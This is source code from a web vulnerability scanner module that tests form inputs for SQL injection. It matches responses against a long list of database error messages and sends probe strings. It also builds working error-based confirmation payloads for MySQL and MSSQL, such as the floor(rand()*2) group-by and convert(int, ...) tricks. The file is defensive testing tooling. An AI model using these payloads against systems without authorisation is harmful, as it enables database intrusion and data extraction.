#include helpers.inc;
#include string_helpers.inc;
#include error_messages_helpers.inc;
#include crawler_responses.inc;
{
	// *********************************************************************************************
	// class for managing and looking for common sql error messages
	// *********************************************************************************************	
	function classSQLErrorMessages(){
		this.plainArray = [
												'Microsoft OLE DB Provider for ODBC Drivers',
                                                'Error Executing Database Query',            
												'Microsoft OLE DB Provider for SQL Server',
												'ODBC Microsoft Access Driver',
												'ODBC SQL Server Driver',
												'supplied argument is not a valid MySQL result',
												'You have an error in your SQL syntax',
												'Incorrect column name',
												'Syntax error or access violation:',
                                                'Invalid column name',
                                                'Must declare the scalar variable',
                                                'Unknown system variable',
                                                'unrecognized token: ',
												'undefined alias:',
												'Can\'t find record in',
												'2147217900',
												'Unknown table',
												'Incorrect column specifier for column',
												'Column count doesn\'t match value count at row',
												'Unclosed quotation mark before the character string',
												'Unclosed quotation mark',
												'Call to a member function row_array() on a non-object in',
												'Invalid SQL:',
												'ERROR: parser: parse error at or near',
												'): encountered SQLException [',
												'Unexpected end of command in statement [',
												'[ODBC Informix driver][Informix]',
												'[Microsoft][ODBC Microsoft Access 97 Driver]',
												'Incorrect syntax near ',
												'[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near',
												'SQL command not properly ended',
												'unexpected end of SQL command',
												'Supplied argument is not a valid PostgreSQL result',
												'internal error [IBM][CLI Driver][DB2/6000]',
                                                'PostgreSQL query failed',    
                                                'Supplied argument is not a valid PostgreSQL result',
												'pg_fetch_row() expects parameter 1 to be resource, boolean given in',
                                                'unterminated quoted string at or near',
                                                'unterminated quoted identifier at or near',
                                                'syntax error at end of input',
                                                'Syntax error in string in query expression',
                                                'Error: 221 Invalid formula',
            									'java.sql.SQLSyntaxErrorException',
                                                'SQLite3::query(): Unable to prepare statement:',
            									'<title>Conversion failed when converting the varchar value \'A\' to data type int.</title>',
            									'SQLSTATE=42603',
            									'org.hibernate.exception.SQLGrammarException:',
												'org.hibernate.QueryException',
												'System.Data.SqlClient.SqlException:',	
												'SqlException',
												'SQLite3::SQLException:',
                                                'Syntax error or access violation:',
                                                'Unclosed quotation mark after the character string',
                                                'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
												'PDOStatement::execute(): SQLSTATE[42601]: Syntax error:',
                                                '<b>SQL error: </b> no such column'            
											];
		this.regexArray = [
												/(Incorrect\ssyntax\snear\s'[^']*')/,
												/(Syntax error: Missing operand after '[^']*' operator)/,
                                                /Syntax error near\s.*?\sin the full-text search condition\s/,
                                                /column "\w{5}" does not exist/,
                                                /near\s[^:]+?:\ssyntax\serror/,
												/(pg_query\(\)[:]*\squery\sfailed:\serror:\s)/,
												/('[^']*'\sis\snull\sor\snot\san\sobject)/,
												/(ORA-\d{4,5}:\s)/,
												/(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)/,
												/(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)/,
												/(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)/,
												/(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)/,
												/(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)/,
												/(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)/,
												/(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')/,
												/(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))/,
												/(Unclosed\squotation\smark\safter\sthe\scharacter\sstring\s'[^']*')/,
												/((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)/,
                                                /((<b>)?Warning(<\/b>)?:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\) expects parameter \d+ to be resource, \w+ given in (<b>)?.*?(<\/b>)? on line (<b>)?\d+(<\/b>)?)/,
												/(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \d)/,
												/(Query\sfailed\:\sERROR\:\scolumn\s"[^"]*"\sdoes\snot\sexist\sLINE\s\d)/,
												/(Query\sfailed\:\sERROR\:\s+unterminated quoted string at or near)/,
												/(The string constant beginning with .*? does not have an ending string delimiter\.)/,
                                                /(Unknown column '[^']+' in '\w+ clause')/
											];										
	}
	
	// *********************************************************************************************
	// search text for all the error messages from the list (plain text and regexes)
	// *********************************************************************************************	
	classSQLErrorMessages.prototype.searchOnText = function(text) {        
		// search plain texts first
		for (var i=0;i<this.plainArray.length;i++) {
			if (text.indexOf(this.plainArray[i]) != -1) return this.plainArray[i];
		}
			
		// search regexes
		for (var i=0;i<this.regexArray.length;i++) {
			var m = this.regexArray[i].exec(text);
			if (m) {return m[0];}
		}			
			
		return false;	
	}
}
{
	// *********************************************************************************************
	// object used for injection test result
	// *********************************************************************************************	
	function InjectionResult(data, adItem){
		this.data = data;
		this.adItem = adItem;
	}
}
{ 
	// *********************************************************************************************
	// SQL injection class 
	// *********************************************************************************************	
	function classSQLInjection(targetUrl, errorMessages, scheme, inputIndex, variationIndex, reflectionPoint){
		this.scheme = scheme;
		this.targetUrl = targetUrl;
		this.errorMessages = errorMessages;
		this.inputIndex = inputIndex;
		this.reflectionPoint = reflectionPoint;
		this.foundVulnOnVariation = false;
		
		if (scheme != null) {
			if (variationIndex != null) {
				this.variations = new TList();
				this.variations.add(variationIndex);
			}
			else this.variations = this.scheme.selectVariationsForInput(inputIndex);
			this.currentVariation = 0;
			this.origValue = this.getOrigValue();
		}
				
		this.lastJob = null;
        this.lastJobConfirm = null;
		this.injectionValidator = new TInjectionValidator(ACUINJSTART, ACUINJEND);		
	}	
	// *********************************************************************************************
	// function to detect if AcuSensor data indicates an SQL injection vulnerability
	// params:  
	//	ad => AspectData object
	// returns: 
	//	an AspectDataItem if true / False
	// *********************************************************************************************
	classSQLInjection.prototype.isSQLInjection = function(ad) {			
		var adItems = ad.getItemsWithKey("SQL_Query");
		if (adItems && adItems.count) 		
		for (var i=0; i<adItems.count; i++)
		{		
			var aditem = adItems.item(i);
			// check aspect data for signs of vulnerability
			if (aditem) {
				// by default use mysql
				var dbType = "mysql";
				
				// try to extract database type
				addData = aditem.getAdditionalData();							
				if (addData && addData.count >= 2) {
					var db = addData.item(1);						
					if (db.indexOf("database=") == 0) {
						db = db.substr(9);
						dbType = db.toLowerCase();
					}
				}
				
				var stringList = aditem.getDataList();
				for (var k=0; k<stringList.count; k++) 
				{					
					var item = stringList.item(k);
					
					if (item.indexOf(this.injectionValidator.startMark) != -1) 
					{							
						if (dbType == 'mysql') {
                            
							if (this.injectionValidator.isMySQLInjection(item)) {
								return new InjectionResult(item, aditem);	
                            }
						} 
						else
						
						if (dbType == 'mssql' || dbType == 'mssql_or_access') {
							if (this.injectionValidator.isMSSQLInjection(item))
							return new InjectionResult(item, aditem);		
						} 
						
						else
						if (dbType == 'pg') {
							if (this.injectionValidator.isPostgreSQLInjection(item))
							return new InjectionResult(item, aditem);							
						} 
						
						else
						if (dbType == 'sqlite') {
							if (this.injectionValidator.isSQLiteInjection(item))
							return new InjectionResult(item, aditem);								
						} 
						
						else				
						if (dbType == 'oracle') {
							if (this.injectionValidator.isOracleSQLInjection(item))
							return new InjectionResult(item, aditem);								
						} 
						
						else								
						if (dbType == 'sybase') {
							if (this.injectionValidator.isSybaseSQLInjection(item))
							return new InjectionResult(item, aditem);								
						} 
						
						else														
						if (this.injectionValidator.isMySQLInjection(item))
							return new InjectionResult(item, aditem);	
					}					
				}				
			} 		
		}	
		
		return false;
	}	
		
	// *********************************************************************************************
	// function to return a non-empty value
	// *********************************************************************************************		
	classSQLInjection.prototype.getOrigValue = function()
	{	
		var value = "";
		for (var i=0; i<this.variations.count; i++){
			var varValue = this.scheme.getVariation(i).item(this.inputIndex);
			// if the value is not yet set
			if(value == "" && varValue != "") {
				value = varValue;
				break;
			}
		}
		return value;
	}
	
	// *********************************************************************************************
	// function to make set a value for the current variation and issue an HTTP request 
	// *********************************************************************************************
	classSQLInjection.prototype.request = function(value)
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		
		// for files manipulate also the input filename and set a valid content-type
		if (this.scheme.hasFileInput && (this.scheme.getInputFlags(this.inputIndex) & INPUT_FLAG_IS_FILE)){
			this.scheme.setInputFileName(this.inputIndex, value);
			this.scheme.setInputContentType(this.inputIndex, "image/png");
			this.scheme.setInputValue(this.inputIndex, value);
		}
		else this.scheme.setInputValue(this.inputIndex, value);		
		
		this.lastJob = new THTTPJob();
		this.lastJob.url = this.targetUrl;		
		if (this.scheme.targetHasAcuSensor) this.lastJob.addAspectHeaders();		
		this.scheme.populateRequest(this.lastJob);
 
        // populate referer tag - some sites may need it
        if (!this.lastJob.request.headerExists('Referer'))
            this.lastJob.request.addHeader('Referer', scanURL.url, false);
 
		this.lastJob.execute();
		var tmp = false;
		if (!this.lastJob.wasError && this.reflectionPoint) {
			// check for stored injection
			this.reflectionPoint.execute();
			this.lastJob.response.copyFrom(this.reflectionPoint.response);
			tmp = this.reflectionPoint.wasError;	
		}
		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)) && !tmp); 
	}	
    
	// *********************************************************************************************
	// function to make set a value for the current variation and issue an HTTP request 
	// *********************************************************************************************
	classSQLInjection.prototype.confirmRequest = function(value)
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		this.scheme.setInputValue(this.inputIndex, value);
		
		this.lastJobConfirm = new THTTPJob();
		this.lastJobConfirm.url = this.targetUrl;
		this.scheme.populateRequest(this.lastJobConfirm);
 
		this.lastJobConfirm.execute();
        
		return (!this.lastJobConfirm.wasError); 
	}
	// *********************************************************************************************
	// generates an report item for the scanner
	// *********************************************************************************************
	classSQLInjection.prototype.alert = function(testValue, matchedText, sourceFile, sourceLine, additionalInfo, acuSensor)
	{	
        this.foundVulnOnVariation = true;
        
		var ri = new TReportItem();
        
        if (matchedText=='Error: 221 Invalid formula')  
            ri.LoadFromFile("lotus_notes_formula_injection.xml");
        else 
        {
            ri.LoadFromFile("SQL_Injection.xml");
		    if (acuSensor) ri.name = ri.name + " (verified)";
        }
        
        var verified = false;
        
        if (!acuSensor && matchedText.startsWith('4Cu')) {
            verified = true;
            ri.name = ri.name + " (verified)";
        }
        
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/SQL Injection";
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;		
		ri.sensorSourceFile = sourceFile;
		ri.sensorSourceLine = sourceLine;
		ri.sensorAdditional = additionalInfo;			
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		
		if (matchedText) {
            if (verified) ri.Details =  ri.Details + "[break]Injected pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";
            else ri.Details =  ri.Details + "[break]Error message found: [pre][blue]" + matchedText + "[/blue][/pre]";
        }
		
		if (this.reflectionPoint) {
			ri.name = ri.name + ' [Stored]';
			ri.details = ri.details + "[break]The input is reflected in [bold][dark]" + this.reflectionPoint.url.url + "[/dark][/bold]";
		}
			
        if (verified) ri.setHttpInfo(this.lastJobConfirm);
        else ri.setHttpInfo(this.lastJob);
        
		AddReportItem(ri);	
	}		
	
	// *********************************************************************************************
	// test if the original page contains an error message
	// *********************************************************************************************
	classSQLInjection.prototype.testForError = function()
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		var response = getCrawlerResponseForSchemeVariation(this.scheme);		
		
		if (response == null) {
			if (!this.request(this.origValue)) return false;		
			response = this.lastJob.response;
		}
		
		if (this.errorMessages.searchOnText(response.toString())) return false;	
		
		return true;
	}	
	
	// *********************************************************************************************
	// test for sql injection 
	// *********************************************************************************************	
	classSQLInjection.prototype.testInjection = function(value, confirmData)
	{
		//trace("testInjection: " + value);
		if (!this.request(value)) return false;
		
		var job = this.lastJob;
		if(this.reflectionPoint) job = this.reflectionPoint;
		
		// if AcuSensor is enabled
		if (job.hasAspectData) {
			// get aspect data information
			var ad = job.getAspectData();
			var injRes = this.isSQLInjection(ad);
			
			if (injRes && injRes.adItem) {				
				var additional = "SQL query: " + injRes.data + "\r\n" + injRes.adItem.additional;
				this.alert(value, "", injRes.adItem.FileName, injRes.adItem.lineNumber, additional, 1);
				return false;
			}
		}		
		
		else {
			if (!this.reflectionPoint) {
				// AcuSensor is NOT enabled
				var matchedText = this.errorMessages.searchOnText(job.response.toString());		
				if (matchedText) {
                    
                    var verified = false;
                    var confirmValue = "";
                    // need to confirm injection
                    if (confirmData && confirmData.length) {                        
                        // iterate through the confirm array                        
                        for (var i=0;i<confirmData.length;i++) {     
                            // prepare marker                       
                            var markerPlain = '4Cu'+randStr(8);
                            var markerEncodedMSSQL = encodeStringAsChar(markerPlain, '+');                            
                            var markerEncodedMYSQL = encodeStringAsChar(markerPlain, ',');                            
                                 
                            // msyql variant 1
                            confirmValue = confirmData[i] + 'and(select 1 from(select count(*),concat((select concat(' + markerEncodedMYSQL + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and' + confirmData[i];
                            if ( this.confirmRequest(confirmValue) && this.lastJobConfirm.response.toString().indexOf(markerPlain) != -1) 
                            {               
                                verified = true;                     
                                break;
                            }
                            
                            // msyql variant 2
                            confirmValue = confirmData[i] + '(select 1 and row(1,1)>(select count(*),concat(concat(' + markerEncodedMYSQL + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + confirmData[i];
                            if ( this.confirmRequest(confirmValue) && this.lastJobConfirm.response.toString().indexOf(markerPlain) != -1) 
                            {   
                                verified = true;                                 
                                break;
                            }
                            
                            // mssql variant 1
                            if (confirmData[i]) confirmValue = confirmData[i] + '+(select convert(int,' + markerEncodedMSSQL + ') FROM syscolumns)+' + confirmData[i];
                            else confirmValue = confirmData[i] + '(select convert(int,' + markerEncodedMSSQL + ') FROM syscolumns)' + confirmData[i];
                                                        
                            if ( this.confirmRequest(confirmValue) && this.lastJobConfirm.response.toString().indexOf(markerPlain) != -1) 
                            {   
                                verified = true;                                 
                                break;
                            }                 
                                       
                            // mssql variant 2
                            if (confirmData[i]) confirmValue = confirmData[i] + '+convert(int,' + markerEncodedMSSQL + ')+' + confirmData[i];
                            else confirmValue = confirmData[i] + 'convert(int,' + markerEncodedMSSQL + ')' + confirmData[i];
                                                        
                            if ( this.confirmRequest(confirmValue) && this.lastJobConfirm.response.toString().indexOf(markerPlain) != -1) 
                            {   
                                verified = true;                                 
                                break;
                            }                            
                        }
                    }
                    
                    if (verified) {
                        //trace('verified');
                        value = confirmValue;
                        matchedText = markerPlain;
                    }
                    
					this.alert(value, matchedText);
					return false;
				}
			}
		}
		
		return true;
	}
	
	// *********************************************************************************************
	// main function to test all input variation
	// *********************************************************************************************	
	classSQLInjection.prototype.startTesting = function()
	{
		for (var i=0; i < this.variations.count; i++) 
		{
			// don't test further variations
			if (this.foundVulnOnVariation) break;	
			this.currentVariation = i;
			
			// different injection strings if AcuSensor is enabled
			if (this.scheme.targetHasAcuSensor || this.reflectionPoint) 
			{	
				// AcuSensor is enabled	
				if (!this.reflectionPoint) { 
					// NO reflection point
					this.injectionValidator.startMark = ACUINJSTART;
					this.injectionValidator.endMark = ACUINJEND;
					
					// basic test
					//if (!this.testInjection("1ACUSTART'\"*/\r\n \tACUEND")) continue;
					if (!this.testInjection("1ACUSTART'\"" + randStr(5) + "ACUEND")) continue;
					// no quotes
					if (!this.testInjection("1ACUSTART ACUEND")) continue;
					// backslash
					if (!this.testInjection("1ACUSTART\\")) continue;
				}
				
				else { 
					// have reflection point
					this.injectionValidator.startMark = "ASbegin";
					this.injectionValidator.endMark = "ASend";
				
					// basic test
					if (!this.testInjection("1ASbegin'\"*/\r\n \tASend")) continue;
					// no quotes
					if (!this.testInjection("1ASbegin ASend")) continue;
					// backslash
					if (!this.testInjection("1ASbegin\\")) continue;                    
				}
			}
			else 
			if (this.errorMessages)				
			{	
				// AcuSensor is NOT enabled				
				if (!this.testForError()) continue;			
				// single quote + double quote
				if (!this.testInjection("1'\"", new Array("", "'", '"'))) continue;                
                // backslash
                if (!this.testInjection("\\")) continue;                
				// single quote + double quote (unicode)
				if (!this.testInjection("1\x00\xc0\xa7\xc0\xa2")) continue;				
				// scalar/variable
				if (!this.testInjection('@@' + randStr(5))) continue;
				// single + double quote (base64 encoded)
				if (!this.testInjection('JyI=')) continue;
				// GBK/Big5 encoding
				if (!this.testInjection('\xbf\'\xbf"')) continue;
				// utf8_decode
				if (!this.testInjection('\xF0\x27\x27\xF0\x22\x22')) continue;
				// conversion (ASP)
				if (!this.testInjection('(select convert(int,CHAR(65)))')) continue;
			}			
		}
	}	
}